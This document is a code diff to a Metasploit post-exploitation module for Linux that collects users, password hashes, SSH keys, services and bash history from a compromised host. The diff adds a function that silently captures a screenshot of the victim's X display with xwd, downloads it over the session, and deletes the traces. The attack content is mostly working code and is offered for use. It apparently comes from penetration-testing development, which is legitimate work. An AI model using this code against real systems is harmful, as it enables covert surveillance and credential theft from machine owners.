@@ -28,7 +28,7 @@ class Metasploit3 < Msf::Post
 				'Description'   => %q{
 						This module gathers basic system information from Linux systems.
 						Enumerates users, hashes, services, network config, routing table, installed packages, 
-						and bash_history
+						,screenshot, and bash_history
 				},
 				'License'       => MSF_LICENSE,
 				'Author'        =>
@@ -74,6 +74,7 @@ class Metasploit3 < Msf::Post
 		hosts = cat_file("/etc/hosts")
 		pwd = cat_file("/etc/passwd")
 
+		screenshot = get_screenshot
 		ssh_keys = get_ssh_keys
 		installed_pkg = get_packages(distro[:distro])
 		installed_svc = get_services(distro[:distro])
@@ -81,6 +82,7 @@ class Metasploit3 < Msf::Post
 
 
 		# Save Enumerated data
+		save("Screenshot", screenshot, "image/x-xwd") if screenshot
 		save("Linux version", distro)
 		save("User accounts", users)
 		save("Network config", nconfig)
@@ -97,12 +99,20 @@ class Metasploit3 < Msf::Post
 	end
 
 	# Save enumerated data
-	def save(msg, data)
-		ltype = "linux.enum"
-		ctype = "text/plain"
-		print_status(msg) if datastore['VERBOSE']
-		loot = store_loot(ltype, ctype, session, data, nil, msg)
-		print_status("#{msg} stored in #{loot.to_s}")
+	def save(msg, data, ctype="text/plain")
+		if ctype == "image/x-xwd"
+			filename = ::Time.now.strftime("%Y%m%d.%M%S") + ".xwd"
+			save_path = Msf::Config.install_root + "/data/" + filename
+			f = ::File.new(save_path, "wb")
+			f.write(data)
+			f.close
+			print_status("#{msg} stored in #{save_path}")
+		else
+			ltype = "linux.enum"
+			print_status(msg) if datastore['VERBOSE']
+			loot = store_loot(ltype, ctype, session, data, nil, msg)
+			print_status("#{msg} stored in #{loot.to_s}")
+		end
 	end
 
 	# Get host name
@@ -129,6 +139,24 @@ class Metasploit3 < Msf::Post
 		print_status("Download: #{filename}") if datastore['VERBOSE']
 		output = read_file(filename)
 		return output
+	end
+
+	def get_screenshot
+		print_status("Capturing screenshot") if datastore['VERBOSE']
+		xwd_filename = "/tmp/" + Rex::Text.rand_text_alpha(5) + ".xwd"
+
+		#Take a snapshot and save it.
+		#We leave the conversion up to the user. Tools such as gimp can open this file format.
+		capture = execute("xwd -root -display :0.0 -out #{xwd_filename}")
+		return nil if capture =~ /Command not found/i
+
+		#Download the screenshot
+		xwd = read_file(xwd_filename)
+
+		#Clean up
+		execute("rm #{xwd_filename}")
+
+		return xwd
 	end
 
 	def get_ssh_keys
